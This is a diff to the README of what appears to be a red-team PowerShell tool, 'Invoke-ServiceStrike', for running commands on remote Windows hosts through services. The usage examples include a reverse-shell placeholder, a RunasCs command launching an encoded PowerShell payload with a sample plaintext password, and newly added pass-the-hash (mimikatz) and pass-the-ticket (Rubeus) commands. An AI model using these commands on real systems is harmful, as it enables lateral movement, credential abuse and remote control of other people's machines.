@@ -9,7 +9,7 @@ This script includes and executes a modified version of <a href="https://gist.gi
 Invoke-ServiceStrike -Command <cmd>
 ```
 ```
-Invoke-ServiceStrike -Command <revShell> [-timeout 45000 -threads 5 -ComputerName '192.168.1.103']
+Invoke-ServiceStrike -Command <revShell> [-timeout <45000> -threads <5> -ComputerName <'192.168.1.103'> -ServiceName <sname>]
 ```
 
 ### RunAs
@@ -21,4 +21,14 @@ If you're working in a non-interactive shell, you can use <a href="https://githu
 
 ```
 Invoke-RunasCs -Domain contoso.local -Username user1 -Password dfgV?DS7-8 -Command "powershell . C:\Invoke-ServiceStrike.ps1;Invoke-ServiceStrike -Command 'cmd /c powershell -e <revb64>' -ServiceName TEST" -logontype 9
+```
+
+### PTH 
+```
+mimikatz.exe "sekurlsa::pth /domain:<> /user:<user> /ntlm:<hash> /run:powershell.exe"
+```
+
+### PTT
+```
+Rubeus.exe -args ptt /ticket:<ticket>
 ```
